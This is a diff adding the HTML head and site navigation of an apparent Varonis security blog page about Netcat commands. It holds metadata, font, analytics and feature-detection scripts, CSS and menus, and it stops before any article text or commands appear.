@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+    <link rel="shortcut icon" href="https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/favicon.ico" />
+		<link href="https://plus.google.com/117025574764707275013" rel="publisher" />  	
+    <script>
+	(function(d) {var config = {kitId: 'ssg8zig', scriptTimeout: 3000, async: false},
+	h=d.documentElement,t=setTimeout(function(){h.className=h.className.replace(/\bwf-loading\b/g,"")+" wf-inactive";},config.scriptTimeout),tk=d.createElement("script"),f=false,s=d.getElementsByTagName("script")[0],a;h.className+=" wf-loading";tk.src='https://use.typekit.net/'+config.kitId+'.js';tk.async=true;tk.onload=tk.onreadystatechange=function(){a=this.readyState;if(f||a&&a!="complete"&&a!="loaded")return;f=true;clearTimeout(t);try{Typekit.load(config)}catch(e){}};s.parentNode.insertBefore(tk,s)
+	})(document);
+	</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+    <script>
+(function(Modernizr){
+
+  // Here are all the values we will test. If you want to use just one or two, comment out the lines of test you don't need.
+  var tests = [
+    //{ name: 'svg', value: 'url(#test)' }, // False positive in IE, supports SVG clip-path, but not on HTML element
+    //{ name: 'inset', value: 'inset(10px 20px 30px 40px)' },
+    //{ name: 'circle', value: 'circle(60px at center)' },
+    //{ name: 'ellipse', value: 'ellipse(50% 50% at 50% 50%)' },
+    { name: 'polygon', value: 'polygon(50% 0%, 0% 100%, 100% 100%)' }
+  ];
+
+  var t = 0, name, value, prop;
+
+  for (; t < tests.length; t++) {
+    name = tests[t].name;
+    value = tests[t].value;
+    Modernizr.addTest('cssclippath' + name, function(){
+      // Try using window.CSS.supports
+      if ( 'CSS' in window && 'supports' in window.CSS ) {
+        for (var i = 0; i < Modernizr._prefixes.length; i++) {
+          prop = Modernizr._prefixes[i] + 'clip-path'
+          
+          if ( window.CSS.supports(prop,value) ) { return true; }
+        }
+        return false;
+      }
+      // Otherwise, use Modernizr.testStyles and examine the property manually
+      return Modernizr.testStyles('#modernizr { '+Modernizr._prefixes.join('clip-path:'+value+'; ')+' }',function(elem, rule) {
+        var style = getComputedStyle(elem),
+            clip = style.clipPath;
+
+        if ( !clip || clip == "none" ) {
+          clip = false;
+
+          for (var i = 0; i < Modernizr._domPrefixes.length; i++) {
+            test = Modernizr._domPrefixes[i] + 'ClipPath';
+            if ( style[test] && style[test] !== "none" ) {
+              clip = true;
+              break;
+            }
+          }
+        }
+
+        return Modernizr.testProp('clipPath') && clip;
+      });
+    });
+
+  }
+
+})(Modernizr);
+
+</script>
+	
+	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>How to Use Netcat Commands: Examples and Cheat Sheets</title>
+
+<!-- This site is optimized with the Yoast SEO Premium plugin v11.7 - https://yoast.com/wordpress/plugins/seo/ -->
+<meta name="description" content="Learn what the Netcat utility program is and the different types of commands it can support to help IT organizations manage their networks in a better way."/>
+<link rel="canonical" href="https://www.varonis.com/blog/netcat-commands/" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="How to Use Netcat Commands: Examples and Cheat Sheets" />
+<meta property="og:description" content="Learn what the Netcat utility program is and the different types of commands it can support to help IT organizations manage their networks in a better way." />
+<meta property="og:url" content="https://www.varonis.com/blog/netcat-commands/" />
+<meta property="og:site_name" content="Inside Out Security" />
+<meta property="article:tag" content="infosec" />
+<meta property="article:section" content="IT Pros" />
+<meta property="article:published_time" content="2019-09-24T17:15:26-04:00" />
+<meta property="article:modified_time" content="2020-03-29T22:09:55-04:00" />
+<meta property="og:updated_time" content="2020-03-29T22:09:55-04:00" />
+<meta property="og:image" content="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png" />
+<meta property="og:image:secure_url" content="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png" />
+<meta property="og:image:width" content="1240" />
+<meta property="og:image:height" content="414" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:description" content="Learn what the Netcat utility program is and the different types of commands it can support to help IT organizations manage their networks in a better way." />
+<meta name="twitter:title" content="How to Use Netcat Commands: Examples and Cheat Sheets" />
+<meta name="twitter:site" content="@varonis" />
+<meta name="twitter:image" content="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png" />
+<meta name="twitter:creator" content="@varonis" />
+<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www.varonis.com/blog/#website","url":"https://www.varonis.com/blog/","name":"Inside Out Security","potentialAction":{"@type":"SearchAction","target":"https://www.varonis.com/blog/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"ImageObject","@id":"https://www.varonis.com/blog/netcat-commands/#primaryimage","url":"https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png","width":1240,"height":414,"caption":"Netcat image of a network"},{"@type":"WebPage","@id":"https://www.varonis.com/blog/netcat-commands/#webpage","url":"https://www.varonis.com/blog/netcat-commands/","inLanguage":"en-US","name":"How to Use Netcat Commands: Examples and Cheat Sheets","isPartOf":{"@id":"https://www.varonis.com/blog/#website"},"primaryImageOfPage":{"@id":"https://www.varonis.com/blog/netcat-commands/#primaryimage"},"datePublished":"2019-09-24T17:15:26-04:00","dateModified":"2020-03-29T22:09:55-04:00","author":{"@id":"https://www.varonis.com/blog/#/schema/person/d57208a50f67873770aae6fc98139f1f"},"description":"Learn what the Netcat utility program is and the different types of commands it can support to help IT organizations manage their networks in a better way.","breadcrumb":{"@id":"https://www.varonis.com/blog/netcat-commands/#breadcrumb"}},{"@type":"BreadcrumbList","@id":"https://www.varonis.com/blog/netcat-commands/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://www.varonis.com/blog/","url":"https://www.varonis.com/blog/","name":"Inside Out Security Blog"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://www.varonis.com/blog/category/it_pros/","url":"https://www.varonis.com/blog/category/it_pros/","name":"IT Pros"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"https://www.varonis.com/blog/netcat-commands/","url":"https://www.varonis.com/blog/netcat-commands/","name":"How to Use Netcat Commands: Examples and Cheat Sheets"}}]},{"@type":["Person"],"@id":"https://www.varonis.com/blog/#/schema/person/d57208a50f67873770aae6fc98139f1f","name":"Jeff Petters","image":{"@type":"ImageObject","@id":"https://www.varonis.com/blog/#authorlogo","url":"https://secure.gravatar.com/avatar/ef3c405a6c5988e72960d668c8cae545?s=96&d=wp_user_avatar&r=g","caption":"Jeff Petters"},"description":"Jeff has been working on computers since his Dad brought home an IBM PC 8086 with dual disk drives. Researching and writing about data security is his dream job.","sameAs":[]}]}</script>
+<!-- / Yoast SEO Premium plugin. -->
+
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Inside Out Security &raquo; Feed" href="https://www.varonis.com/blog/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Inside Out Security &raquo; Comments Feed" href="https://www.varonis.com/blog/comments/feed/" />
+<link rel='stylesheet' id='bcct_style-css'  href='https://blogvaronis2.wpengine.com/wp-content/plugins/better-click-to-tweet/assets/css/styles.css?ver=3.0' type='text/css' media='all' />
+<link rel='stylesheet' id='YoutubeShortcodeMargenn-css'  href='https://blogvaronis2.wpengine.com/wp-content/plugins/youtube-shortcode/youtube-shortcode.css?ver=5.3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/genericons/genericons.css?ver=3.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='twentysixteen-fa-css'  href='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/css/font-awesome.css?ver=4.7.0' type='text/css' media='all' />
+<link rel='stylesheet' id='twentysixteen-styles-css'  href='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/style.css?ver=4.7.0' type='text/css' media='all' />
+<link rel='stylesheet' id='enlighter-local-css'  href='https://blogvaronis2.wpengine.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=3.10.0' type='text/css' media='all' />
+<script>if (document.location.protocol != "https:") {document.location = document.URL.replace(/^http:/i, "https:");}</script><script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/assets/js/varonis.min.js?ver=5.3.2'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/plugins/varonis_customcode/js/varonis_scripts.js?ver=1.0'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/plugins/vr_rwdimagemaps/js/jquery.rwdImageMaps.min.js?ver=5.3.2'></script>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/plugins/vr_rwdimagemaps/js/rwdimagemaps.js?ver=5.3.2'></script>
+<!--[if lt IE 9]>
+<script type='text/javascript' src='https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/js/html5.js?ver=3.7.3'></script>
+<![endif]-->
+<script type="text/javascript">
+	!function(){var analytics=window.analytics=window.analytics||[];if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","group","track","ready","alias","page","once","off","on"];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src=("https:"===document.location.protocol?"https://":"http://")+"cdn.segment.com/analytics.js/v1/"+t+"/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n)};analytics.SNIPPET_VERSION="3.0.0";
+		window.analytics.load("dsysvxcb3m");
+	window.analytics.page();
+	  }}();
+</script>
+<link rel='https://api.w.org/' href='https://www.varonis.com/blog/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blogvaronis2.wpengine.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blogvaronis2.wpengine.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='shortlink' href='https://www.varonis.com/blog/?p=12994' />
+<link rel="alternate" type="application/json+oembed" href="https://www.varonis.com/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.varonis.com%2Fblog%2Fnetcat-commands%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.varonis.com/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.varonis.com%2Fblog%2Fnetcat-commands%2F&#038;format=xml" />
+<meta name="twitter:partner" content="tfwp"><link rel="icon" href="https://blogvaronis2.wpengine.com/wp-content/uploads/2015/10/cropped-cropped-Varonis_Horizontal-300x300-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://blogvaronis2.wpengine.com/wp-content/uploads/2015/10/cropped-cropped-Varonis_Horizontal-300x300-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="https://blogvaronis2.wpengine.com/wp-content/uploads/2015/10/cropped-cropped-Varonis_Horizontal-300x300-180x180.png" />
+<meta name="msapplication-TileImage" content="https://blogvaronis2.wpengine.com/wp-content/uploads/2015/10/cropped-cropped-Varonis_Horizontal-300x300-270x270.png" />
+
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="How to Use Netcat Commands: Examples and Cheat Sheets"><meta name="twitter:description" content="The Netcat utility program supports a wide range of commands to manage networks and monitor the flow of traffic data between systems. Computer networks, including the world wide web, are&hellip;"><meta name="twitter:image" content="https://blogvaronis2.wpengine.com/wp-content/uploads/2019/09/hero.png"><meta name="twitter:image:alt" content="Netcat image of a network">
+		<style type="text/css" id="wp-custom-css">
+			ol.EnlighterJS, ul.EnlighterJS {
+  text-indent: 0;
+  padding: 20px 20px 10px 45px;
+	font-family: Menlo,Consolas,Monaco,monospace;
+}
+
+@media(max-width: 490px) {
+	ol.EnlighterJS,
+  ul.EnlighterJS {
+		padding: 20px 20px 10px 45px;	
+	}
+}
+
+.atomicEnlighterJSWrapper pre, ol.atomicEnlighterJS, ul.atomicEnlighterJS {
+	background-color: #212234;
+}
+
+ol.atomicEnlighterJS li,
+ul.atomicEnlighterJS li {
+	font-size: 15px !important;
+    color: #888;
+	margin-bottom: 8px !important;
+	list-style-position: outside;	
+	line-height: 1.5;
+	padding-left: 0 !important;
+}
+
+.atomicEnlighterJS span {
+	color: #f7f8fc;
+	font-size: 15px;
+}
+
+.atomicEnlighterJS .kw4 {
+    color: #4a90e2;
+}
+
+.atomicEnlighterJS .st0 {
+    color: 
+    #00B188 
+}
+.atomicEnlighterJS .st1 {
+    color: 
+    #00B188 
+}
+
+.atomicEnlighterJS .co1 {
+	color: #00ECE0;
+}
+
+.atomicEnlighterJS, .atomicEnlighterJSTabPane, .atomicEnlighterJSWrapper {
+    font-family: Menlo,Consolas,Monaco,monospace;
+}
+
+.atomicEnlighterJSWrapper pre {
+	padding: 20px 30px 20px 35px;
+    font-size: 15px;
+    color: #fff;
+}		</style>
+		</head>
+
+<body data-rsssl=1 class="post-template-default single single-post postid-12994 single-format-standard group-blog">
+
+<div id="page" class="site">
+	<div class="site-inner">
+		<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+		            <div class="topad-wrap">
+            <div class="pcenter">
+            <p> <strong>Live Cyber Attack Lab</strong> 🎯 Watch our IR team detect & respond to a rogue insider trying to steal data!            <a href="/cyber-workshop?ref=topbar"> Choose a Session</a> <i class="fa fa-caret-right" aria-hidden="true"></i>
+            </p>
+            <span class="close-topad">X</span>
+            </div>
+            </div>
+                        
+
+		<header id="masthead" class="site-header" role="banner">
+        
+            <div id="searchForm" class="search-form-wrap">
+            <div class="pcenter">
+            	<span id="closeSearchForm" class="closeSFormBtn"><i class="fa fa-times" aria-hidden="true"></i>
+</span>
+            	
+<form role="search" method="get" class="search-form" action="https://www.varonis.com/blog/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="What can we help you find?" value="" name="s" />
+	</label>
+	<button type="submit" class="search-submit"><span class="screen-reader-text">Search</span></button>
+</form>
+            </div>
+            </div>
+        
+			<div class="site-header-main">
+            
+            <div class="top-menu-wrap">
+            <div class="pcenter">
+            <div class="menu-top-menu-container"><ul id="menu-top-menu" class="top-menu"><li id="menu-item-11989" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11989"><a href="https://www.varonis.com/support/">Support</a></li>
+<li id="menu-item-11990" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11990"><a href="https://help.varonis.com/s/">Community</a></li>
+<li id="menu-item-11991" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11991"><a href="https://www.varonis.com/services/">Services</a></li>
+<li id="menu-item-11992" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11992"><a href="tel:18772928767">1-877-292-8767</a></li>
+</ul></div>                        <span class="searchFormBtn">Search</span>     
+            </div>
+            </div>
+            
+            <div class="site-header-content">
+            <div class="pcenter">
+				<div class="site-branding">
+                    <p class="site-title">
+                    <a href="https://www.varonis.com/" rel="home">
+					<img alt="Varonis.com" title="Varonis.com" src="https://blogvaronis2.wpengine.com/wp-content/themes/varonis-2019/images/varonis_Logo.svg" />                    </a>
+                    </p>
+				</div><!-- .site-branding -->
+
+									<button id="menu-toggle" class="menu-toggle">Menu</button>
+
+					<div id="site-header-menu" class="site-header-menu">
+						
+							<nav id="site-navigation" class="main-navigation" role="navigation" aria-label="Primary Menu">
+								<div class="menu-header-right-container"><ul id="menu-header-right" class="primary-menu"><li id="menu-item-11984" class="mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-11984"><a href="https://www.varonis.com/solutions/">Solutions</a>
+<ul class="sub-menu">
+	<li id="menu-item-11985" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-11985"><a>Use Cases</a>
+	<ul class="sub-menu">
+		<li id="menu-item-11987" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11987"><a href="https://www.varonis.com/products/datadvantage/">Remediation &#038; Governance</a></li>
+		<li id="menu-item-11988" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11988"><a href="https://www.varonis.com/products/datalert/">Security Analytics</a></li>
+		<li id="menu-item-11993" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11993"><a href="https://www.varonis.com/products/data-classification-engine/">Data Classification</a></li>
+		<li id="menu-item-11994" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11994"><a href="https://www.varonis.com/solutions/ransomware/">Ransomware</a></li>
+		<li id="menu-item-11995" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11995"><a href="https://info.varonis.com/insider-threats">Insider Threats</a></li>
+		<li id="menu-item-11996" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11996"><a href="https://www.varonis.com/products/edge">External Threats</a></li>
+	</ul>
+</li>
+	<li id="menu-item-11997" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-11997"><a>Industries</a>
+	<ul class="sub-menu">
+		<li id="menu-item-11998" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11998"><a href="https://www.varonis.com/solutions/financial-services/">Finance</a></li>
+		<li id="menu-item-11999" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11999"><a href="https://www.varonis.com/solutions/federal-government/">Federal Government</a></li>
+		<li id="menu-item-12000" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12000"><a href="https://blog.varonis.com/hipaa-compliance/">Healthcare</a></li>
+		<li id="menu-item-12001" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12001"><a href="https://www.varonis.com/case-study/loyola-university-maryland/">Education</a></li>
+		<li id="menu-item-12002" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12002"><a href="https://www.varonis.com/products/data-security-platform/">Enterprise</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12003" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12003"><a>Compliance</a>
+	<ul class="sub-menu">
+		<li id="menu-item-12004" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12004"><a href="https://www.varonis.com/solutions/gdpr-compliance/">GDPR</a></li>
+		<li id="menu-item-13753" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13753"><a href="https://www.varonis.com/solutions/ccpa">CCPA</a></li>
+		<li id="menu-item-12005" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12005"><a href="https://blog.varonis.com/hipaa-compliance/">HIPAA</a></li>
+		<li id="menu-item-12006" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12006"><a href="https://info.varonis.com/varonis-and-sox-compliance">SOX</a></li>
+		<li id="menu-item-12007" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12007"><a href="https://www.varonis.com/solutions/financial-services/">PCI DSS</a></li>
+		<li id="menu-item-12008" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12008"><a href="https://www.varonis.com/solutions/iso-27001-compliance/">ISO 27001</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12009" class="tri whitepaper menu-item menu-item-type-custom menu-item-object-custom menu-item-12009"><a href="#">Insight</a></li>
+	<li id="menu-item-12010" class="cta cta-dra menu-item menu-item-type-custom menu-item-object-custom menu-item-12010"><a href="https://info.varonis.com/start">See How you Rank<span class="menu-item-description"><span class="strong">Data Risk Assessment</span>
+<span class="notes">Non-intrusive, hassle-free.</span><span class="btn c-white">Learn More</span></span></span></a></li>
+</ul>
+</li>
+<li id="menu-item-12011" class="mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12011"><a href="#">Platform</a>
+<ul class="sub-menu">
+	<li id="menu-item-12012" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12012"><a>Learn More</a>
+	<ul class="sub-menu">
+		<li id="menu-item-11986" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11986"><a href="https://www.varonis.com/how-it-works/">How It Works</a></li>
+		<li id="menu-item-12013" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12013"><a href="https://www.varonis.com/partners/technology-partners/">Integrations</a></li>
+		<li id="menu-item-12014" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12014"><a href="https://info.varonis.com/buy">How to Buy</a></li>
+		<li id="menu-item-12015" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12015"><a href="https://www.varonis.com/results/">Real Results</a></li>
+		<li id="menu-item-12016" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12016"><a href="https://www.varonis.com/operational-journey/">Take the Journey</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12017" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12017"><a>Products</a>
+	<ul class="sub-menu">
+		<li id="menu-item-12018" class="flash semibold menu-item menu-item-type-custom menu-item-object-custom menu-item-12018"><a href="https://www.varonis.com/products/data-security-platform/">Data Security Platform<span class="menu-item-description">Product Suite Overview</span></a></li>
+		<li id="menu-item-12019" class="underline semibold menu-item menu-item-type-custom menu-item-object-custom menu-item-12019"><a href="https://www.varonis.com/products/data-classification-engine/">Data Classification Engine<span class="menu-item-description">Sensitive Data Discovery</span></a></li>
+		<li id="menu-item-12020" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12020"><a href="https://www.varonis.com/products/dataprivilege/">DataPrivilege</a></li>
+		<li id="menu-item-12021" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12021"><a href="https://www.varonis.com/products/data-transport-engine/">Data Transport Engine</a></li>
+		<li id="menu-item-12022" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12022"><a href="https://www.varonis.com/products/automation-engine/">Automation Engine</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12023" class="product2 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12023"><a href="#">Products</a>
+	<ul class="sub-menu">
+		<li id="menu-item-12024" class="semibold menu-item menu-item-type-custom menu-item-object-custom menu-item-12024"><a href="https://www.varonis.com/products/datadvantage/">DatAdvantage<span class="menu-item-description">Data Audit &#038; Protection</span></a></li>
+		<li id="menu-item-12025" class="underline semibold menu-item menu-item-type-custom menu-item-object-custom menu-item-12025"><a href="https://www.varonis.com/products/datalert/">DatAlert<span class="menu-item-description">Security Analytics</span></a></li>
+		<li id="menu-item-12026" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12026"><a href="https://www.varonis.com/products/datanswers/">DatAnswers</a></li>
+		<li id="menu-item-12027" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12027"><a href="https://www.varonis.com/products/edge/">Edge</a></li>
+		<li id="menu-item-12028" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12028"><a href="https://www.varonis.com/products/policy-pack/">Policy Pack</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12029" class="tri demo menu-item menu-item-type-custom menu-item-object-custom menu-item-12029"><a href="#">Demo</a></li>
+	<li id="menu-item-12030" class="cta cta-demo menu-item menu-item-type-custom menu-item-object-custom menu-item-12030"><a href="#">Get a Personalized<span class="menu-item-description"><span class="strong">Varonis Demo</span>
+<span class="notes">(In-Person or Online)</span>
+<span class="btn c-white">Schedule Now</span></span></a></li>
+</ul>
+</li>
+<li id="menu-item-12031" class="simple menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12031"><a href="https://www.varonis.com/company/">Company</a>
+<ul class="sub-menu">
+	<li id="menu-item-12032" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12032"><a href="https://www.varonis.com/company/">About Varonis</a></li>
+	<li id="menu-item-12033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12033"><a href="https://www.varonis.com/company/varonis-life/">Varonis Life</a></li>
+	<li id="menu-item-12034" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12034"><a href="https://info.varonis.com/careers">Careers</a></li>
+	<li id="menu-item-12035" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12035"><a href="https://www.varonis.com/customers/">Customers</a></li>
+	<li id="menu-item-12036" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12036"><a href="http://ir.varonis.com/">Investor Relations</a></li>
+	<li id="menu-item-12037" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12037"><a href="https://www.varonis.com/company/press/">Press</a></li>
+	<li id="menu-item-12038" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12038"><a href="https://www.varonis.com/company/brand/">Brand</a></li>
+	<li id="menu-item-12039" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12039"><a href="https://www.varonis.com/company/contact-us/">Contact Us</a></li>
+</ul>
+</li>
+<li id="menu-item-12040" class="mega menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12040"><a href="https://www.varonis.com/resources/">Resources</a>
+<ul class="sub-menu">
+	<li id="menu-item-12041" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12041"><a href="#">Research</a>
+	<ul class="sub-menu">
+		<li id="menu-item-12042" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12042"><a href="https://www.varonis.com/research/">Analyst Reports</a></li>
+		<li id="menu-item-12043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12043"><a href="https://www.varonis.com/whitepapers/">Whitepapers</a></li>
+		<li id="menu-item-12044" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12044"><a href="https://www.varonis.com/datasheets/">Datasheets</a></li>
+		<li id="menu-item-12045" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12045"><a href="https://www.varonis.com/customers/">Case Studies</a></li>
+		<li id="menu-item-12046" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12046"><a href="https://www.varonis.com/2018-data-risk-report/">2018 Data Risk Report</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12047" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12047"><a href="#">Education</a>
+	<ul class="sub-menu">
+		<li id="menu-item-12457" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12457"><a href="https://www.varonis.com/how-to-videos/">How-To Videos</a></li>
+		<li id="menu-item-12048" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12048"><a href="https://www.varonis.com/free-security-training/">Free Security Training</a></li>
+		<li id="menu-item-12049" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-12049"><a href="https://www.varonis.com/blog">Blog</a></li>
+		<li id="menu-item-12050" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12050"><a href="https://soundcloud.com/inside-out-security">Podcast</a></li>
+		<li id="menu-item-12051" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12051"><a href="https://www.varonis.com/guides/">Guides</a></li>
+		<li id="menu-item-12052" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12052"><a href="https://www.varonis.com/videos/">Videos</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12053" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12053"><a href="https://www.varonis.com/events/">Events</a>
+	<ul class="sub-menu">
+		<li id="menu-item-12054" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12054"><a href="https://www.varonis.com/webinars/">Webinars</a></li>
+		<li id="menu-item-12055" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12055"><a href="https://www.varonis.com/events/">Conferences</a></li>
+	</ul>
+</li>
+	<li id="menu-item-12056" class="tri webinars menu-item menu-item-type-custom menu-item-object-custom menu-item-12056"><a href="https://www.varonis.com/webinars/">Webinars</a></li>
+	<li id="menu-item-12057" class="cta cta-webinar menu-item menu-item-type-custom menu-item-object-custom menu-item-12057"><a href="https://www.varonis.com/webinars/">Featured Webinar<span class="menu-item-description"><span class="title"><span class="br"><span class="strong">DatAlert</span> Master Class</span></span>
+<span class="notes">On Demand</span>
+<span class="btn c-white">Watch Now</span></span></a></li>
+</ul>
+</li>
+<li id="menu-item-12058" class="simple menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12058"><a href="#">Partners</a>
+<ul class="sub-menu">
+	<li id="menu-item-12059" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12059"><a href="https://www.varonis.com/partners/technology-partners/">Technology Partners</a></li>
+	<li id="menu-item-12060" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12060"><a href="https://www.varonis.com/partners/channel-partners/">Channel Partners</a></li>
+	<li id="menu-item-12061" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12061"><a href="https://www.varonis.com/service-providers/">Service Providers</a></li>
+	<li id="menu-item-12062" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12062"><a href="https://partnercommunity.varonis.com/s/">Partner Portal</a></li>
+</ul>
+</li>
+<li id="menu-item-12063" class="demo menu-item menu-item-type-custom menu-item-object-custom menu-item-12063"><a href="https://info.varonis.com/demo">Request a Demo</a></li>
+</ul></div>							</nav><!-- .main-navigation -->
+					
+
+					</div><!-- .site-header-menu -->
+							</div>
+            </div>
+            </div><!-- .site-header-main -->
+
+		</header><!-- .site-header -->
+
+		<div id="content" class="site-content">
+
+
+<div id="primary" class="content-area generic-page">
+
